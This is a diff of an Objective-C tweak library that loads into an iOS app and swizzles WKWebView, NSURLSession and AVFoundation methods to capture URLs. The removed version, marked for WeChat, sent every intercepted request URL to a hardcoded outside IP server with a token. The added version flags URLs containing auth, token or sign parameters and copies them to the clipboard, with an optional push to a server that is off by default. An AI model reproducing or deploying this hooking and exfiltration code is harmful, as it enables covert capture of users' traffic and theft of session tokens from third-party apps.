@@ -1,50 +1,72 @@
-
 //
-// ALIWeChatSniffer_NativeVerbose.m
-// Native-only verbose sniffer: AV AccessLog + AV swizzle + NSURLSession hooks for extra visibility.
-// Use with caution: NSURLSession hooks may interfere with app networking; use for short diagnostics.
+// AliSniffer.m
+// WKWebView-gated sniffer: only activates after opening target page.
+// For authorized debugging on your own app/pages.
 //
 
 #import <Foundation/Foundation.h>
 #import <UIKit/UIKit.h>
-#import <AVFoundation/AVFoundation.h>
+#import <WebKit/WebKit.h>
 #import <objc/runtime.h>
 #import <objc/message.h>
 
-#pragma mark - Config
-static NSString * const kPushHost  = @"http://139.155.57.242:8088";
-static NSString * const kPushToken = @"@Yy166431";
-static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/api/push_form", @"/push", @"/push_raw"]; }
+#pragma mark - ===== Config =====
 
-static const NSTimeInterval kDedupeWindow = 60.0;
-static const NSTimeInterval kBootGateDelay = 1.0;
+// 你们页面的域名（命中后才启用）
+static NSString * const kTargetHost = @"ced.wtyibxc.cn";
 
-static const BOOL kEnableNSURLSessionHook = YES; // <--- enabled for diagnostics
-static const BOOL kCopyOnHit = YES;
+// 可选：也可以限制路径关键字（不需要就留空）
+static inline BOOL MatchTargetPath(NSString *path) {
+    if (!path.length) return YES;
+    // 例：只在某个目录/接口页面启用
+    // return [path containsString:@"/mag/livevideo/"];
+    return YES;
+}
+
+// 命中后：是否弹提示/是否自动复制
 static const BOOL kPopupOnHit = YES;
+static const BOOL kCopyOnHit  = YES;
 
-#ifndef DEBUG_LOG
-#define DEBUG_LOG 0
-#endif
-#if DEBUG_LOG
-#define LOG(fmt, ...) NSLog((@"[ALI-NATIVE-V] " fmt), ##__VA_ARGS__)
-#else
-#define LOG(...)
-#endif
+// 抓取哪些类型
+static inline BOOL looksLikeInteresting(NSString *u){
+    if (!u.length) return NO;
+    NSString *s = u.lowercaseString;
+    if ([s containsString:@".m3u8"] || [s containsString:@".flv"] || [s containsString:@".ts"] || [s containsString:@".mp4"]) return YES;
+    if ([s containsString:@"auth"] || [s containsString:@"token"] || [s containsString:@"sign"] || [s containsString:@"txsecret"] || [s containsString:@"auth_key="]) return YES;
+    return NO;
+}
 
-#pragma mark - Globals
+// 去重窗口（秒）
+static const NSTimeInterval kDedupeWindow = 30.0;
+
+// ⚠️ 可选：推送到你自家服务器（默认关闭）
+// 你如果要开启，把 kEnablePush 改成 YES，并填你自己的地址/Token
+static const BOOL kEnablePush = NO;
+static NSString * const kPushHost  = @"http://127.0.0.1:8088";   // TODO: 改成你自己的
+static NSString * const kPushToken = @"CHANGE_ME";              // TODO: 改成你自己的
+static inline NSArray<NSString*> *kPushPaths(void){ return @[@"/api/push_raw", @"/push_raw", @"/push"]; }
+
+#pragma mark - ===== Globals =====
 static dispatch_queue_t gq;
 static NSMutableDictionary<NSString*, NSDate*> *g_seen;
-static id g_accessLogToken1 = nil, g_accessLogToken2 = nil;
-static BOOL g_av_swizzled = NO;
+static atomic_bool g_enabled = false;      // 命中目标页面后才 true
+static atomic_bool g_hooksInstalled = false;
 
-#pragma mark - Helpers
+#pragma mark - ===== Helpers =====
+static inline void on_main(void(^blk)(void)){
+    if (!blk) return;
+    if (NSThread.isMainThread) blk();
+    else dispatch_async(dispatch_get_main_queue(), blk);
+}
+
 static NSString *jsonStringify(NSDictionary *obj){
     if (!obj) return nil;
     NSData *d = [NSJSONSerialization dataWithJSONObject:obj options:0 error:nil];
     return d ? [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding] : nil;
 }
-static void _ali_post_chain(NSArray<NSString*> *paths, NSUInteger idx, NSData *body){
+
+static void _post_chain(NSArray<NSString*> *paths, NSUInteger idx, NSData *body){
+    if (!kEnablePush) return;
     if (idx >= paths.count) return;
     NSString *url = [kPushHost stringByAppendingString:paths[idx]];
     NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:url]];
@@ -52,162 +74,184 @@ static void _ali_post_chain(NSArray<NSString*> *paths, NSUInteger idx, NSData *b
     [req setValue:@"text/plain; charset=utf-8" forHTTPHeaderField:@"Content-Type"];
     [req setValue:kPushToken forHTTPHeaderField:@"X-Token"];
     req.HTTPBody = body;
+
     [[[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(__unused NSData *d, NSURLResponse *r, NSError *e){
         NSInteger sc = [r isKindOfClass:[NSHTTPURLResponse class]] ? ((NSHTTPURLResponse*)r).statusCode : -1;
-        if (e || sc < 200 || sc >= 300) _ali_post_chain(paths, idx+1, body);
+        if (e || sc < 200 || sc >= 300) _post_chain(paths, idx+1, body);
     }] resume];
 }
+
 static void postText(NSString *text){
-    if (!text) return;
-    _ali_post_chain(kPushPaths(), 0, [text dataUsingEncoding:NSUTF8StringEncoding]);
+    if (!kEnablePush) return;
+    if (!text.length) return;
+    _post_chain(kPushPaths(), 0, [text dataUsingEncoding:NSUTF8StringEncoding]);
 }
 
-static inline void on_main(void(^blk)(void)){ if (!blk) return; if (NSThread.isMainThread) blk(); else dispatch_async(dispatch_get_main_queue(), blk); }
-static BOOL looksLikeStream(NSString *u){ if (!u) return NO; NSString *s=u.lowercaseString; if ([s containsString:@".m3u8"]||[s containsString:@".flv"]||[s containsString:@".ts"]||[s containsString:@".mp4"]) return YES; if ([s containsString:@"auth_key="]||[s containsString:@"txsecret"]||[s containsString:@"vzan"]||[s containsString:@"weizan"]) return YES; return NO; }
-static BOOL dedupe_skip(NSString *u){ if (!u) return YES; __block BOOL skip=NO; dispatch_sync(gq, ^{ NSDate *last=g_seen[u]; NSDate *now = [NSDate date]; if (last && [now timeIntervalSinceDate:last] < kDedupeWindow) skip = YES; else { g_seen[u]=now; skip = NO; } }); return skip; }
-static void popup_safe(NSString *title, NSString *msg, NSString *copyText){ (void)title; if (copyText.length) on_main(^{ @try{ UIPasteboard.generalPasteboard.string = copyText; }@catch(__unused NSException *e){} }); on_main(^{ @try{ UIWindow *w = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject; if (!w) return; UILabel *lab = [[UILabel alloc] initWithFrame:CGRectMake(20, 80, 280, 60)]; lab.numberOfLines=0; lab.backgroundColor=[[UIColor blackColor] colorWithAlphaComponent:0.7]; lab.textColor=[UIColor whiteColor]; lab.text=msg; lab.layer.cornerRadius=8; lab.layer.masksToBounds=YES; [w addSubview:lab]; dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0*NSEC_PER_SEC)), dispatch_get_main_queue(), ^{ [lab removeFromSuperview]; }); }@catch(__unused NSException *e){} }); }
-
-#pragma mark - Event handling
-static void handleCapturedURL(NSString *url, NSString *from){
-    if (!url) return;
-    if (dedupe_skip(url)) return;
-    NSDictionary *evt = @{@"type":@"NATIVE_HIT",@"from":from?:@"native",@"url":url,@"ts":@([[NSDate date] timeIntervalSince1970]*1000)};
-    NSString *s = jsonStringify(evt); if (s) postText(s);
-    if (looksLikeStream(url) && kPopupOnHit){ if (kCopyOnHit) on_main(^{ UIPasteboard.generalPasteboard.string = url; }); popup_safe(@"捕获流", [NSString stringWithFormat:@"%@\n%@", from?:@"native", url], url); }
-}
-
-#pragma mark - AV AccessLog
-static void installAVObservers(void){
-    @try{
-        NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
-        if (!g_accessLogToken1){
-            g_accessLogToken1 = [nc addObserverForName:AVPlayerItemNewAccessLogEntryNotification object:nil queue:nil usingBlock:^(NSNotification *note){
-                @try{
-                    id item = note.object; if (!item) return;
-                    if ([item respondsToSelector:@selector(accessLog)]){
-                        id log = [item accessLog];
-                        if (log && [log respondsToSelector:@selector(events)]){
-                            NSArray *evs = [log events]; id ev = evs.lastObject;
-                            SEL s = NSSelectorFromString(@"URI");
-#pragma clang diagnostic push
-#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
-                            if (ev && [ev respondsToSelector:s]){ NSString *uri = [ev performSelector:s]; if (uri.length) dispatch_async(gq, ^{ handleCapturedURL(uri, @"AVAccessLog"); }); }
-#pragma clang diagnostic pop
-                        }
-                    }
-                }@catch(__unused NSException *e){}
-            }];
-        }
-        if (!g_accessLogToken2){
-            g_accessLogToken2 = [nc addObserverForName:AVPlayerItemNewErrorLogEntryNotification object:nil queue:nil usingBlock:^(NSNotification *note){
-                @try{
-                    id item = note.object; if (!item) return;
-                    if ([item respondsToSelector:@selector(errorLog)]){
-                        id log = [item errorLog];
-                        if (log && [log respondsToSelector:@selector(events)]){
-                            for (id ev in [log events]){
-                                SEL s = NSSelectorFromString(@"URI");
-#pragma clang diagnostic push
-#pragma clang diagnostic ignored "-Warc-performSelector-leaks"
-                                if (ev && [ev respondsToSelector:s]){ NSString *uri = [ev performSelector:s]; if (uri.length) dispatch_async(gq, ^{ handleCapturedURL(uri, @"AVErrorLog"); }); }
-#pragma clang diagnostic pop
-                            }
-                        }
-                    }
-                }@catch(__unused NSException *e){}
-            }];
-        }
-    }@catch(__unused NSException *e){}
-}
-
-#pragma mark - AV swizzle (initWithURL)
-static id (*orig_AVURLAsset_initWithURL_options)(id, SEL, NSURL*, NSDictionary*) = NULL;
-static id (*orig_AVPlayerItem_initWithURL)(id, SEL, NSURL*) = NULL;
-
-static id replaced_AVURLAsset_initWithURL_options(id self, SEL _cmd, NSURL *URL, NSDictionary *options){
-    @try{ if (URL && URL.absoluteString) dispatch_async(gq, ^{ handleCapturedURL(URL.absoluteString, @"AVURLAsset(swizzle)"); }); }@catch(__unused NSException *e){}
-    if (orig_AVURLAsset_initWithURL_options) return orig_AVURLAsset_initWithURL_options(self, _cmd, URL, options);
-    return ((id (*)(id, SEL, NSURL*, NSDictionary*))objc_msgSend)(self, _cmd, URL, options);
-}
-static id replaced_AVPlayerItem_initWithURL(id self, SEL _cmd, NSURL *URL){
-    @try{ if (URL && URL.absoluteString) dispatch_async(gq, ^{ handleCapturedURL(URL.absoluteString, @"AVPlayerItem(swizzle)"); }); }@catch(__unused NSException *e){}
-    if (orig_AVPlayerItem_initWithURL) return orig_AVPlayerItem_initWithURL(self, _cmd, URL);
-    return ((id (*)(id, SEL, NSURL*))objc_msgSend)(self, _cmd, URL);
-}
-
-static void install_av_swizzles_safe(void){
-    @try{
-        if (g_av_swizzled) return;
-        Class a = NSClassFromString(@"AVURLAsset");
-        Class p = NSClassFromString(@"AVPlayerItem");
-        if (!a && !p) return;
-        if (a){
-            SEL sel = @selector(initWithURL:options:); Method m = class_getInstanceMethod(a, sel);
-            if (m){
-                orig_AVURLAsset_initWithURL_options = (void*)method_getImplementation(m);
-                method_setImplementation(m, (IMP)replaced_AVURLAsset_initWithURL_options);
-                LOG(@"[install] AVURLAsset swizzled");
-            }
-        }
-        if (p){
-            SEL sel2 = @selector(initWithURL:); Method m2 = class_getInstanceMethod(p, sel2);
-            if (m2){
-                orig_AVPlayerItem_initWithURL = (void*)method_getImplementation(m2);
-                method_setImplementation(m2, (IMP)replaced_AVPlayerItem_initWithURL);
-                LOG(@"[install] AVPlayerItem swizzled");
-            }
-        }
-        g_av_swizzled = YES;
-        NSDictionary *ev = @{@"type":@"AV_SWIZZLES_INSTALLED",@"ts":@([[NSDate date] timeIntervalSince1970]*1000)};
-        NSString *s = jsonStringify(ev); if (s) postText(s);
-    }@catch(__unused NSException *e){ LOG(@"swizzle err %@", e); }
-}
-
-#pragma mark - NSURLSession hooks (diagnostics)
-static NSURLSessionTask* (*orig_NSURLSession_dataTaskWithRequest)(id, SEL, NSURLRequest*);
-static NSURLSessionTask* (*orig_NSURLSession_dataTaskWithURL)(id, SEL, NSURL*);
-
-static NSURLSessionTask* replaced_NSURLSession_dataTaskWithRequest(id self, SEL _cmd, NSURLRequest *req){
-    @try{ if (req.URL.absoluteString) dispatch_async(gq, ^{ NSDictionary *evt=@{@"type":@"NSURL_REQ",@"from":@"NSURLSession(Request)",@"url":req.URL.absoluteString,@"ts":@([[NSDate date] timeIntervalSince1970]*1000)}; NSString *s=jsonStringify(evt); if(s) postText(s); }); }@catch(__unused NSException *e){}
-    return orig_NSURLSession_dataTaskWithRequest(self, _cmd, req);
-}
-static NSURLSessionTask* replaced_NSURLSession_dataTaskWithURL(id self, SEL _cmd, NSURL *u){
-    @try{ if (u.absoluteString) dispatch_async(gq, ^{ NSDictionary *evt=@{@"type":@"NSURL_REQ",@"from":@"NSURLSession(URL)",@"url":u.absoluteString,@"ts":@([[NSDate date] timeIntervalSince1970]*1000)}; NSString *s=jsonStringify(evt); if(s) postText(s); }); }@catch(__unused NSException *e){}
-    return orig_NSURLSession_dataTaskWithURL(self, _cmd, u);
-}
-static void install_nsurlsession_hooks(void){
-    if (!kEnableNSURLSessionHook) return;
-    @try{
-        Class c = NSClassFromString(@"NSURLSession");
-        if (!c) return;
-        Method m1 = class_getInstanceMethod(c, @selector(dataTaskWithRequest:));
-        if (m1){ orig_NSURLSession_dataTaskWithRequest = (void*)method_getImplementation(m1); method_setImplementation(m1, (IMP)replaced_NSURLSession_dataTaskWithRequest); LOG(@"[install] NSURLSession dataTaskWithRequest hooked"); }
-        Method m2 = class_getInstanceMethod(c, @selector(dataTaskWithURL:));
-        if (m2){ orig_NSURLSession_dataTaskWithURL = (void*)method_getImplementation(m2); method_setImplementation(m2, (IMP)replaced_NSURLSession_dataTaskWithURL); LOG(@"[install] NSURLSession dataTaskWithURL hooked"); }
-        NSDictionary *ev=@{@"type":@"NSURL_HOOKS_INSTALLED",@"ts":@([[NSDate date] timeIntervalSince1970]*1000)}; NSString *s=jsonStringify(ev); if(s) postText(s);
-    }@catch(__unused NSException *e){ LOG(@"ns hook err %@", e); }
-}
-
-#pragma mark - Startup
-static void start_if_needed(void){
-    dispatch_async(dispatch_get_main_queue(), ^{
-        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(kBootGateDelay*NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-            installAVObservers();
-            install_av_swizzles_safe();
-            install_nsurlsession_hooks();
-            NSDictionary *ev=@{@"type":@"LOADER_INIT_NATIVE_VERBOSE",@"app":@"WeChat",@"ts":@([[NSDate date] timeIntervalSince1970]*1000)}; NSString *s=jsonStringify(ev); if(s) postText(s);
-        });
+static BOOL dedupe_skip(NSString *u){
+    if (!u.length) return YES;
+    __block BOOL skip = NO;
+    dispatch_sync(gq, ^{
+        NSDate *last = g_seen[u];
+        NSDate *now  = [NSDate date];
+        if (last && [now timeIntervalSinceDate:last] < kDedupeWindow) skip = YES;
+        else { g_seen[u] = now; skip = NO; }
     });
+    return skip;
+}
+
+static void toast(NSString *msg){
+    if (!kPopupOnHit) return;
+    on_main(^{
+        @try{
+            UIWindow *w = UIApplication.sharedApplication.keyWindow ?: UIApplication.sharedApplication.windows.firstObject;
+            if (!w) return;
+
+            UILabel *lab = [[UILabel alloc] initWithFrame:CGRectMake(16, 80, MIN(360, w.bounds.size.width-32), 70)];
+            lab.numberOfLines = 0;
+            lab.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.72];
+            lab.textColor = UIColor.whiteColor;
+            lab.font = [UIFont systemFontOfSize:12];
+            lab.text = msg;
+            lab.layer.cornerRadius = 10;
+            lab.layer.masksToBounds = YES;
+            [w addSubview:lab];
+
+            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+                [lab removeFromSuperview];
+            });
+        } @catch (__unused NSException *e) {}
+    });
+}
+
+static BOOL isTargetURL(NSURL *u){
+    if (!u) return NO;
+    NSString *host = u.host.lowercaseString ?: @"";
+    if (![host isEqualToString:kTargetHost.lowercaseString]) return NO;
+    return MatchTargetPath(u.path ?: @"");
+}
+
+static void enableIfTarget(NSURL *u, NSString *from){
+    if (!u) return;
+    if (!isTargetURL(u)) return;
+
+    bool expected = false;
+    if (atomic_compare_exchange_strong(&g_enabled, &expected, true)) {
+        NSString *msg = [NSString stringWithFormat:@"✅ Sniffer Enabled\n%@\n%@", from ?: @"", u.absoluteString ?: @""];
+        NSLog(@"[ALI-WK] %@", msg);
+        toast(msg);
+
+        NSDictionary *evt = @{@"type":@"ENABLED",@"from":from?:@"", @"url":u.absoluteString?:@"", @"ts":@((long long)(NSDate.date.timeIntervalSince1970*1000))};
+        NSString *s = jsonStringify(evt);
+        if (s) postText(s);
+    }
+}
+
+static void handleCapturedURL(NSString *url, NSString *from){
+    if (!url.length) return;
+    if (!atomic_load(&g_enabled)) return;          // 关键：未命中目标页面，不处理
+    if (dedupe_skip(url)) return;
+
+    NSLog(@"[ALI-WK][HIT][%@] %@", from ?: @"", url);
+
+    if (looksLikeInteresting(url)) {
+        if (kCopyOnHit) on_main(^{ @try{ UIPasteboard.generalPasteboard.string = url; }@catch(__unused NSException *e){} });
+        if (kPopupOnHit) toast([NSString stringWithFormat:@"🎯 %@\n%@", from ?: @"HIT", url]);
+    }
+
+    NSDictionary *evt = @{@"type":@"HIT",@"from":from?:@"", @"url":url, @"ts":@((long long)(NSDate.date.timeIntervalSince1970*1000))};
+    NSString *s = jsonStringify(evt);
+    if (s) postText(s);
+}
+
+#pragma mark - ===== Hooks: WKWebView =====
+
+static BOOL (*orig_WKWebView_loadRequest)(id, SEL, NSURLRequest*);
+static BOOL replaced_WKWebView_loadRequest(id self, SEL _cmd, NSURLRequest *req){
+    @try{
+        NSURL *u = req.URL;
+        if (u.absoluteString.length) {
+            enableIfTarget(u, @"WKWebView loadRequest");
+            if (atomic_load(&g_enabled)) handleCapturedURL(u.absoluteString, @"WK loadRequest");
+        }
+    } @catch(__unused NSException *e) {}
+    return orig_WKWebView_loadRequest ? orig_WKWebView_loadRequest(self, _cmd, req) : ((BOOL(*)(id,SEL,NSURLRequest*))objc_msgSend)(self,_cmd,req);
+}
+
+// 一些 App 用 private 的 _loadRequest:
+static void* (*orig_WKWebView__loadRequest)(id, SEL, NSURLRequest*, BOOL, id);
+static void* replaced_WKWebView__loadRequest(id self, SEL _cmd, NSURLRequest *req, BOOL b, id i){
+    @try{
+        NSURL *u = req.URL;
+        if (u.absoluteString.length) {
+            enableIfTarget(u, @"WKWebView _loadRequest");
+            if (atomic_load(&g_enabled)) handleCapturedURL(u.absoluteString, @"WK _loadRequest");
+        }
+    } @catch(__unused NSException *e) {}
+    return orig_WKWebView__loadRequest ? orig_WKWebView__loadRequest(self,_cmd,req,b,i) : ((void*(*)(id,SEL,NSURLRequest*,BOOL,id))objc_msgSend)(self,_cmd,req,b,i);
+}
+
+#pragma mark - ===== Hooks: NSURLSession (only when enabled) =====
+static NSURLSessionTask* (*orig_NSURLSession_dataTaskWithRequest)(id, SEL, NSURLRequest*);
+static NSURLSessionTask* replaced_NSURLSession_dataTaskWithRequest(id self, SEL _cmd, NSURLRequest *req){
+    @try{
+        if (atomic_load(&g_enabled) && req.URL.absoluteString.length) {
+            handleCapturedURL(req.URL.absoluteString, @"NSURLSession");
+        }
+    } @catch(__unused NSException *e) {}
+    return orig_NSURLSession_dataTaskWithRequest ? orig_NSURLSession_dataTaskWithRequest(self,_cmd,req) : ((NSURLSessionTask*(*)(id,SEL,NSURLRequest*))objc_msgSend)(self,_cmd,req);
+}
+
+#pragma mark - ===== Install =====
+static void install_hooks_once(void){
+    bool expected = false;
+    if (!atomic_compare_exchange_strong(&g_hooksInstalled, &expected, true)) return;
+
+    @try{
+        if (!gq) gq = dispatch_queue_create("com.ali.wk.gated", DISPATCH_QUEUE_SERIAL);
+        if (!g_seen) g_seen = [NSMutableDictionary dictionary];
+
+        Class wk = NSClassFromString(@"WKWebView");
+        if (wk) {
+            Method m1 = class_getInstanceMethod(wk, @selector(loadRequest:));
+            if (m1) {
+                orig_WKWebView_loadRequest = (void*)method_getImplementation(m1);
+                method_setImplementation(m1, (IMP)replaced_WKWebView_loadRequest);
+                NSLog(@"[ALI-WK] hook WKWebView loadRequest installed");
+            }
+
+            SEL selPrivate = NSSelectorFromString(@"_loadRequest:shouldOpenExternalURLs:requestInitiatedByClient:");
+            Method m2 = class_getInstanceMethod(wk, selPrivate);
+            if (m2) {
+                orig_WKWebView__loadRequest = (void*)method_getImplementation(m2);
+                method_setImplementation(m2, (IMP)replaced_WKWebView__loadRequest);
+                NSLog(@"[ALI-WK] hook WKWebView _loadRequest installed");
+            }
+        }
+
+        // NSURLSession：只在 enabled 后才处理（函数内部判断），降低干扰
+        Class s = NSClassFromString(@"NSURLSession");
+        if (s) {
+            Method ms = class_getInstanceMethod(s, @selector(dataTaskWithRequest:));
+            if (ms) {
+                orig_NSURLSession_dataTaskWithRequest = (void*)method_getImplementation(ms);
+                method_setImplementation(ms, (IMP)replaced_NSURLSession_dataTaskWithRequest);
+                NSLog(@"[ALI-WK] hook NSURLSession dataTaskWithRequest installed");
+            }
+        }
+
+        NSDictionary *evt = @{@"type":@"LOADED",@"ts":@((long long)(NSDate.date.timeIntervalSince1970*1000)),
+                              @"target":kTargetHost ?: @""};
+        NSString *sjson = jsonStringify(evt);
+        if (sjson) postText(sjson);
+    } @catch(__unused NSException *e) {
+        NSLog(@"[ALI-WK] install err: %@", e);
+    }
 }
 
 __attribute__((constructor))
 static void init_all(void){
-    if (!gq) gq = dispatch_queue_create("com.ali.native.verbose", DISPATCH_QUEUE_SERIAL);
-    if (!g_seen) g_seen = [NSMutableDictionary dictionary];
-    NSNotificationCenter *nc = [NSNotificationCenter defaultCenter];
-    [nc addObserverForName:UIApplicationDidFinishLaunchingNotification object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
-    [nc addObserverForName:UIApplicationDidBecomeActiveNotification object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
-    if (NSClassFromString(@"UIScene")){
-        [nc addObserverForName:@"UISceneDidActivateNotification" object:nil queue:nil usingBlock:^(__unused NSNotification *n){ start_if_needed(); }];
-    }
+    // 尽量晚一点安装，避免早期类未加载
+    dispatch_async(dispatch_get_main_queue(), ^{
+        install_hooks_once();
+    });
 }
